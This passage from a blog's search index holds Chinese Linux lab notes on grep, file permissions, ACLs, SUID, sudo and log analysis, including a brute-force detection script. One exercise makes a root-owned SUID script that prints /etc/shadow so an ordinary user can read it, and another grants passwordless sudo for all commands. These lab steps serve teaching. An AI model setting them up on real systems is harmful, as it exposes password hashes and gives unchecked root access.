class="string">&quot;error&quot;</span> file  <span class="comment">#忽略大小写</span></span><br><span class="line">grep -v <span class="string">&quot;debug&quot;</span> file  <span class="comment">#反向匹配，排除搜索模式</span></span><br><span class="line">grep -n <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#显示行号</span></span><br><span class="line">grep -c <span class="string">&quot;eqwe&quot;</span> file  <span class="comment">#统计行数</span></span><br><span class="line">grep -r <span class="string">&quot;123&quot;</span> /etc/  <span class="comment">#递归搜索目录</span></span><br><span class="line">grep -w <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#精确匹配</span></span><br><span class="line">grep -o <span class="string">&quot;[0-9]&quot;</span> file  <span class="comment">#仅输出匹配内容</span></span><br><span class="line">grep -A 12 <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#显示匹配行以及后12行 </span></span><br><span class="line">grep -B 14 <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#显示匹配行以及前14行</span></span><br><span class="line">grep -C 18 <span class="string">&quot;qwe&quot;</span> file  <span class="comment">#显示匹配行以及前后各18行</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux实操1</title>
      <link href="/2025/08/03/linux%E5%AE%9E%E6%93%8D1/"/>
      <url>/2025/08/03/linux%E5%AE%9E%E6%93%8D1/</url>
      
        <content type="html"><![CDATA[<h1 id="大作业要求"><a href="#大作业要求" class="headerlink" title="大作业要求"></a>大作业要求</h1><h4 id="1、不看笔记完成"><a href="#1、不看笔记完成" class="headerlink" title="1、不看笔记完成"></a>1、不看笔记完成</h4><h4 id="2、命令解释"><a href="#2、命令解释" class="headerlink" title="2、命令解释"></a>2、命令解释</h4><p>eg：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ddd<span class="comment">#ddd是干什么的</span></span><br></pre></td></tr></table></figure><h4 id="3、回显截图"><a href="#3、回显截图" class="headerlink" title="3、回显截图"></a>3、回显截图</h4><h2 id="实验1：文件目录结构与基本命令操作"><a href="#实验1：文件目录结构与基本命令操作" class="headerlink" title="实验1：文件目录结构与基本命令操作"></a>实验1：文件目录结构与基本命令操作</h2><p>1、在&#x2F;tmp目录下创建如下目录结构：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/tmp/test/</span><br><span class="line">├── dir1/</span><br><span class="line">│   ├── file1.txt</span><br><span class="line">│   └── file2.txt</span><br><span class="line">├── dir2/</span><br><span class="line">│   └── subdir/</span><br><span class="line">└── file3.txt</span><br></pre></td></tr></table></figure><p>①cd &#x2F;tmp #进入tmp文件夹</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152531969.png"></p><p>②mkdir -p test&#x2F;dir1 test&#x2F;dir2&#x2F;subdir #在当前目录创建一个test父级文件夹，并且创建dir1、dir2子文件夹，并在dir2中创建subdir子文件夹</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152731980.png"></p><p>③cd test&#x2F;dir1 #进入新建的dir1文件夹，touch file1.txt file2.txt #创建file1、file2两个txt文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152801030.png"></p><p>④touch file3.txt #创建file3.txt文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152829966.png"></p><p>⑤至此目录结构创建完成</p><p>2、将dir1目录及其内容复制到dir2&#x2F;subdir下</p><p>①cp -r dir1 dir2&#x2F;subdir #将dir1完全复制到subdir下</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152855231.png"></p><p>3、查找&#x2F;tmp目录下所有.txt文件并显示详细信息</p><p>①find &#x2F;tmp -type f -name “*.txt” -exec ls -l {} ; #搜索&#x2F;tmp目录下所有txt文件，并执行ls -l命令，{}替换为文件路径</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152920058.png"></p><p>4、将file3.txt移动到dir1目录并重命名为newfile.txt</p><p>①mv test&#x2F;file3.txt test&#x2F;dir1&#x2F;newfile.txt #在tmp目录下，将file3.txt移动到dir1并重命名为newfile.txt，需要绝对路径</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803152947625.png"></p><h2 id="实验2：用户与组管理"><a href="#实验2：用户与组管理" class="headerlink" title="实验2：用户与组管理"></a>实验2：用户与组管理</h2><p>1、创建用户user1、user2和组group1</p><p>useradd -m user1#创建user1，创建user2同理，groupadd group1 #创建组group1</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153018280.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153039905.png"></p><p>2、将user1和user2加入group1组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153107450.png"></p><p>3、创建目录&#x2F;shared，设置权限使group1组成员可以读写，其他人无权限</p><p>mkdir shared #创建shared目录</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153126630.png"></p><p>chgrp group1 shared #将目录所属组变为group1，chmod 770 shared #将目录权限改为属组可读写，其他人无权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153144268.png"></p><p>4、验证user1可以在&#x2F;shared中创建文件，user3(非组成员)不能访问</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153210596.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153224472.png"></p><h2 id="实验3：权限管理-UGO"><a href="#实验3：权限管理-UGO" class="headerlink" title="实验3：权限管理(UGO)"></a>实验3：权限管理(UGO)</h2><p>1、创建文件&#x2F;data&#x2F;secret.txt，内容为”Top Secret”</p><p>mkdir &#x2F;data #创建data目录，vim secret.txt #创建secret文件并编写内容</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153256986.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153312410.png"></p><p>2、设置权限：所有者root可读写，组admin可读，其他人无权限</p><p>groupadd admin #创建admin组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153418797.png"></p><p>chgrp admin secret.txt #将文件属组改为admin</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153434104.png"></p><p>chmod 740 secret.txt #设置权限为root可读写，组admin可读，其他无权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153450867.png"></p><p>3、创建用户testuser并尝试访问该文件验证权限</p><p>useradd testuser #创建testuser</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153513883.png"></p><p>su testuser #切换到testuser用户，cat secret.txt #获取文件，验证权限，无法访问，权限不够</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153529921.png"></p><p>4、使用ACL添加testuser的读写权限</p><p>setfacl -m u:testuser:rw- secret.txt #给testuser设置权限，可读写secret.txt</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153548526.png"></p><p>再次切换到testuser，cat secret.txt验证是否能访问，成功访问</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153603961.png"></p><h2 id="实验4：SUID权限应用"><a href="#实验4：SUID权限应用" class="headerlink" title="实验4：SUID权限应用"></a>实验4：SUID权限应用</h2><p>1、创建脚本&#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile，内容为显示&#x2F;etc&#x2F;shadow文件内容</p><p>vim &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh #创建脚本文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153655093.png"></p><p>chmod u+x &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh  #给文件设置可执行权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153710345.png"></p><p>2、设置脚本所有者为root并添加SUID权限</p><p>chown root &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh   #设置脚本所有者为root</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153723810.png"></p><p>chmod 4755 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh #设置suid权限，4表示suid，也可使用chmod u+s来设置suid权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153748232.png"></p><p>3、使用普通用户执行该脚本验证权限提升</p><p>su - user1  #切换到普通用户</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153804171.png"></p><p>cat &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile  #使用命令来验证能否查看脚本内容</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153822790.png"></p><p>成功查看</p><p>4、实验完成后移除SUID权限</p><p>chmod 755 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;showfile.sh  #移除suid权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153840253.png"></p><p>要求：对脚本内容进行注释</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#showfile</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash</span></span><br><span class="line"><span class="string">cat /etc/shadow&#x27;</span> &gt; /usr/local/bin/showfile</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/showfile</span><br></pre></td></tr></table></figure><h2 id="实验5：文件属性保护"><a href="#实验5：文件属性保护" class="headerlink" title="实验5：文件属性保护"></a>实验5：文件属性保护</h2><p>1、创建重要配置文件&#x2F;etc&#x2F;important.conf</p><p>touch &#x2F;etc&#x2F;important.conf #创建文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153925705.png"></p><p>2、使用chattr命令防止文件被修改或删除</p><p>chattr +i &#x2F;etc&#x2F;importtant.conf #设置i属性，防止修改删除</p><p>lsattr &#x2F;etc&#x2F;importtant.conf #查看属性</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153944567.png"></p><p>3、尝试修改和删除文件验证保护效果</p><p>rm &#x2F;etc&#x2F;importtant.conf #删除文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803153959428.png"></p><p>4、恢复文件正常属性</p><p>chattr &#x3D;表示移除所有属性，移除后进行验证，是否能删除</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154014963.png"></p><p>成功删除</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154028650.png"></p><h2 id="实验6：sudo权限配置"><a href="#实验6：sudo权限配置" class="headerlink" title="实验6：sudo权限配置"></a>实验6：sudo权限配置</h2><p>1、创建用户admin和组sudoadmin</p><p>useradd admin #创建用户，groupadd admin #创建组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154043700.png"></p><p>此时admin用户无法使用sudo无密码执行</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154057227.png"></p><p>2、配置sudo使sudoadmin组成员可以执行所有命令无需密码</p><p>visudo修改配置文件，添加%sudoadmin ALL&#x3D;(ALL:ALL) NOPASSWD: ALL</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154115116.png"></p><p>3、将admin用户加入sudoadmin组</p><p>usermod -aG sudoadmin admin #将用户加入组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154132357.png"></p><p>4、验证admin用户可以使用sudo执行特权命令</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154145543.png"></p><p>成功执行</p><h2 id="实验7：综合权限管理"><a href="#实验7：综合权限管理" class="headerlink" title="实验7：综合权限管理"></a>实验7：综合权限管理</h2><p>1、创建目录&#x2F;project，属组为devteam</p><p>先创建目录和组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154200718.png"></p><p>修改&#x2F;project属组为devteam</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154213425.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154229983.png"></p><p>2、设置权限：组成员可读写，其他人只读</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154256184.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154308399.png"></p><p>3、设置SGID权限使新建文件自动继承组权限</p><p>chmod g+s可设置sgid权限</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154321067.png"></p><p>4、创建用户dev1、dev2并加入devteam组</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154332694.png"></p><p>5、验证dev1创建的文件dev2可以编辑</p><p>切换到dev1用户，在project目录下创建一个1.txt文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154343649.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154354225.png"></p><p>切换到dev2用户，尝试修改1.txt文件</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154409774.png"></p><p>成功执行</p><h3 id="实验8：日志分析与安全审计："><a href="#实验8：日志分析与安全审计：" class="headerlink" title="实验8：日志分析与安全审计："></a>实验8：日志分析与安全审计：</h3><p>1、创建日志文件<br> 将以下内容保存为 <code>/var/log/application.log</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-03-15 09:10:22 [INFO] User &#x27;admin&#x27; authenticated from 192.168.1.100 (session: SESS-7X2G9P)</span><br><span class="line">2024-03-15 09:11:05 [ERROR] Failed login attempt for user &#x27;root&#x27; from 10.0.0.55 (reason: invalid password)</span><br><span class="line">2024-03-15 09:12:33 [WARNING] High CPU usage detected (92%) on server-node-01</span><br><span class="line">2024-03-15 09:13:17 [SECURITY] Sensitive file accessed: /etc/shadow by user &#x27;backup&#x27;</span><br><span class="line">2024-03-15 09:14:02 [DEBUG] API request: GET /api/v1/users?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</span><br><span class="line">2024-03-15 09:15:48 [INFO] Payment processed: $250.00 via Credit Card (ref: PAY-8832)</span><br><span class="line">2024-03-15 09:16:30 [ERROR] Database connection timeout (MySQL@10.0.0.100:3306)</span><br><span class="line">2024-03-15 09:17:11 [ALERT] SSH brute force detected from 45.33.12.88 (15 attempts)</span><br></pre></td></tr></table></figure><p>2、设置权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 640 /var/log/application.log</span><br><span class="line">chown root:adm /var/log/application.log</span><br></pre></td></tr></table></figure><p><strong>任务1.1</strong>：统计日志中所有错误事件的数量</p><p><strong>任务1.2</strong>：提取所有包含IP地址的行（仅显示IP）</p><p><strong>任务2.1</strong>：查看<code>SECURITY</code>事件及其前后1行内容</p><p><strong>任务3.1</strong>：找出所有涉及金额的记录（含<code>$</code>符号）</p><p><strong>扩展任务</strong>：提取金额数值并计算总和</p><p>​   时间范围统计：统计09:10-09:15期间的事件数量</p><p><strong>任务4.1</strong>：检测潜在暴力破解行为</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed login\|brute force&quot;</span> /var/log/application.log</span><br></pre></td></tr></table></figure><p>编写自动化脚本，analyzer.sh，并使用chmod +x赋予执行权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># 多功能日志分析工具</span><br><span class="line"># 用法：./analyzer.sh [日志文件路径]</span><br><span class="line"></span><br><span class="line">LOG_FILE=&quot;$&#123;1:-/var/log/syslog&#125;&quot;  # 默认使用syslog，可指定其他文件</span><br><span class="line">TEMP_IP_FILE=&quot;/tmp/ips.tmp&quot;       # IP临时文件</span><br><span class="line">TEMP_AMOUNT_FILE=&quot;/tmp/amounts.tmp&quot; # 金额临时文件</span><br><span class="line"></span><br><span class="line"># 任务1.1: 统计错误事件数量</span><br><span class="line">analyze_errors() &#123;</span><br><span class="line">    echo &quot;===== 任务1.1: 错误事件统计 =====&quot;</span><br><span class="line">    local error_count=$(grep -i -E &quot;error|fail|critical|exception&quot; &quot;$LOG_FILE&quot; | wc -l)</span><br><span class="line">    echo &quot;总错误事件数量: $error_count&quot;</span><br><span class="line">    </span><br><span class="line">    # 错误类型细分</span><br><span class="line">    echo -e &quot;\n错误类型分布:&quot;</span><br><span class="line">    grep -i -o -E &quot;error|fail|critical|exception&quot; &quot;$LOG_FILE&quot; | sort | uniq -c | sort -nr</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 任务1.2: 提取所有IP地址</span><br><span class="line">extract_ips() &#123;</span><br><span class="line">    echo &quot;===== 任务1.2: IP地址提取 =====&quot;</span><br><span class="line">    # 使用增强IP正则表达式</span><br><span class="line">    grep -E -o &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; &quot;$LOG_FILE&quot; | sort -u &gt; &quot;$TEMP_IP_FILE&quot;</span><br><span class="line">    echo &quot;找到唯一IP地址: $(wc -l &lt; &quot;$TEMP_IP_FILE&quot;)&quot;</span><br><span class="line">    echo -e &quot;\n前10个IP:&quot;</span><br><span class="line">    head -n 10 &quot;$TEMP_IP_FILE&quot;</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 任务2.1: 查看SECURITY事件及上下文</span><br><span class="line">show_security_events() &#123;</span><br><span class="line">    echo &quot;===== 任务2.1: SECURITY事件分析 =====&quot;</span><br><span class="line">    local security_count=$(grep -i &quot;SECURITY&quot; &quot;$LOG_FILE&quot; | wc -l)</span><br><span class="line">    echo &quot;找到SECURITY事件: $security_count&quot;</span><br><span class="line">    </span><br><span class="line">    if [ &quot;$security_count&quot; -gt 0 ]; then</span><br><span class="line">        echo -e &quot;\nSECURITY事件及上下文 (前5个):&quot;</span><br><span class="line">        grep -i &quot;SECURITY&quot; -A 1 -B 1 &quot;$LOG_FILE&quot; | head -n 15</span><br><span class="line">    else</span><br><span class="line">        echo &quot;未找到SECURITY事件&quot;</span><br><span class="line">    fi</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 任务3.1: 金额记录分析</span><br><span class="line">analyze_amounts() &#123;</span><br><span class="line">    echo &quot;===== 任务3.1: 金额记录分析 =====&quot;</span><br><span class="line">    # 查找所有包含$符号的行</span><br><span class="line">    grep &quot;\$&quot; &quot;$LOG_FILE&quot; &gt; &quot;$TEMP_AMOUNT_FILE&quot;</span><br><span class="line">    local amount_count=$(wc -l &lt; &quot;$TEMP_AMOUNT_FILE&quot;)</span><br><span class="line">    echo &quot;找到包含金额的记录: $amount_count&quot;</span><br><span class="line">    </span><br><span class="line">    if [ &quot;$amount_count&quot; -gt 0 ]; then</span><br><span class="line">        # 扩展任务: 提取金额并计算总和</span><br><span class="line">        echo -e &quot;\n金额记录示例 (前5个):&quot;</span><br><span class="line">        head -n 5 &quot;$TEMP_AMOUNT_FILE&quot;</span><br><span class="line">        </span><br><span class="line">        # 提取金额数值</span><br><span class="line">        local total_amount=0</span><br><span class="line">        local amounts=()</span><br><span class="line">        while IFS= read -r line; do</span><br><span class="line">            # 匹配$后跟数字/小数点的金额</span><br><span class="line">            if [[ &quot;$line&quot; =~ \$([0-9]+(\.[0-9]&#123;1,2&#125;)?) ]]; then</span><br><span class="line">                amount=&quot;$&#123;BASH_REMATCH[1]&#125;&quot;</span><br><span class="line">                amounts+=(&quot;$amount&quot;)</span><br><span class="line">                total_amount=$(awk &quot;BEGIN &#123;printf \&quot;%.2f\&quot;, $total_amount + $amount&#125;&quot;)</span><br><span class="line">            fi</span><br><span class="line">        done &lt; &quot;$TEMP_AMOUNT_FILE&quot;</span><br><span class="line">        </span><br><span class="line">        echo -e &quot;\n金额总和: \$$total_amount&quot;</span><br><span class="line">        echo &quot;提取金额数量: $&#123;#amounts[@]&#125;&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;未找到金额记录&quot;</span><br><span class="line">    fi</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 扩展任务: 时间范围统计</span><br><span class="line">time_range_analysis() &#123;</span><br><span class="line">    echo &quot;===== 扩展任务: 时间范围统计 (09:10-09:15) =====&quot;</span><br><span class="line">    # 根据日志格式调整时间匹配模式</span><br><span class="line">    local time_count=$(grep -E &quot;09:(1[0-4]|15)&quot; &quot;$LOG_FILE&quot; | wc -l)</span><br><span class="line">    echo &quot;09:10-09:15期间的事件数量: $time_count&quot;</span><br><span class="line">    </span><br><span class="line">    # 显示该时间段的事件类型分布</span><br><span class="line">    echo -e &quot;\n事件类型分布:&quot;</span><br><span class="line">    grep -E &quot;09:(1[0-4]|15)&quot; &quot;$LOG_FILE&quot; | grep -o -E &quot;\[[A-Z]+\]|\b[A-Z]&#123;3,&#125;\b&quot; | sort | uniq -c | sort -nr | head -5</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 任务4.1: 检测潜在暴力破解</span><br><span class="line">detect_bruteforce() &#123;</span><br><span class="line">    echo &quot;===== 任务4.1: 潜在暴力破解检测 =====&quot;</span><br><span class="line">    # 检测失败的登录尝试</span><br><span class="line">    echo &quot;检测失败的登录尝试...&quot;</span><br><span class="line">    local failed_logins=$(grep -i &quot;fail&quot; &quot;$LOG_FILE&quot; | grep -E &quot;login|auth|ssh&quot;)</span><br><span class="line">    </span><br><span class="line">    if [ -n &quot;$failed_logins&quot; ]; then</span><br><span class="line">        # 提取IP和尝试次数</span><br><span class="line">        echo &quot;$failed_logins&quot; | grep -E -o &quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot; | sort | uniq -c | sort -nr &gt; &quot;$TEMP_IP_FILE&quot;</span><br><span class="line">        </span><br><span class="line">        local suspicious_count=0</span><br><span class="line">        echo -e &quot;\n登录失败统计:&quot;</span><br><span class="line">        while IFS= read -r line; do</span><br><span class="line">            attempts=$(echo &quot;$line&quot; | awk &#x27;&#123;print $1&#125;&#x27;)</span><br><span class="line">            ip=$(echo &quot;$line&quot; | awk &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">            </span><br><span class="line">            if [ &quot;$attempts&quot; -gt 5 ]; then</span><br><span class="line">                echo &quot;[!] 可疑: IP $ip 有 $attempts 次失败尝试&quot;</span><br><span class="line">                ((suspicious_count++))</span><br><span class="line">            else</span><br><span class="line">                echo &quot;[ ] 正常: IP $ip 有 $attempts 次失败尝试&quot;</span><br><span class="line">            fi</span><br><span class="line">        done &lt; &quot;$TEMP_IP_FILE&quot;</span><br><span class="line">        </span><br><span class="line">        echo -e &quot;\n检测到 $suspicious_count 个可疑IP&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;未找到失败登录记录&quot;</span><br><span class="line">    fi</span><br><span class="line">    echo</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 主函数</span><br><span class="line">main() &#123;</span><br><span class="line">    # 检查日志文件是否存在</span><br><span class="line">    if [ ! -f &quot;$LOG_FILE&quot; ]; then</span><br><span class="line">        echo &quot;错误: 日志文件不存在 - $LOG_FILE&quot;</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">    </span><br><span class="line">    echo &quot;===== 开始分析日志: $LOG_FILE =====&quot;</span><br><span class="line">    echo &quot;文件大小: $(du -h &quot;$LOG_FILE&quot; | cut -f1)&quot;</span><br><span class="line">    echo &quot;最后修改: $(stat -c %y &quot;$LOG_FILE&quot;)&quot;</span><br><span class="line">    echo &quot;总行数: $(wc -l &lt; &quot;$LOG_FILE&quot;)&quot;</span><br><span class="line">    echo</span><br><span class="line">    </span><br><span class="line">    # 执行所有分析任务</span><br><span class="line">    analyze_errors</span><br><span class="line">    extract_ips</span><br><span class="line">    show_security_events</span><br><span class="line">    analyze_amounts</span><br><span class="line">    time_range_analysis</span><br><span class="line">    detect_bruteforce</span><br><span class="line">    </span><br><span class="line">    # 清理临时文件</span><br><span class="line">    rm -f &quot;$TEMP_IP_FILE&quot; &quot;$TEMP_AMOUNT_FILE&quot;</span><br><span class="line">    </span><br><span class="line">    echo &quot;===== 分析完成 =====&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 执行主函数</span><br><span class="line">main</span><br></pre></td></tr></table></figure><p>执行后如图</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154427410.png"></p><p><strong>任务5.1</strong>：分析脚本文件生成安全事件报告</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;安全事件报告&quot;</span> &gt; report.txt<span class="comment">#输出安全事件报告标题到report中</span></span><br><span class="line"><span class="built_in">date</span> &gt;&gt; report.txt                  <span class="comment">#输出日期到报告中</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== 高风险事件 ===&quot;</span> &gt;&gt; report.txt    <span class="comment">#输出高风险事件标题</span></span><br><span class="line">grep -E <span class="string">&quot;SECURITY|ALERT&quot;</span> /var/log/application.log &gt;&gt; report.txt   <span class="comment">#匹配SECURITY和ALERT事件，并输出到报告中</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== 异常IP列表 ===&quot;</span> &gt;&gt; report.txt <span class="comment">#输出异常IP到报告中 </span></span><br><span class="line">grep -Eo <span class="string">&quot;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span> /var/log/application.log | <span class="built_in">sort</span> -u &gt;&gt; report.txt    <span class="comment">#匹配IP，并输出到报告中</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/20250803154450789.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
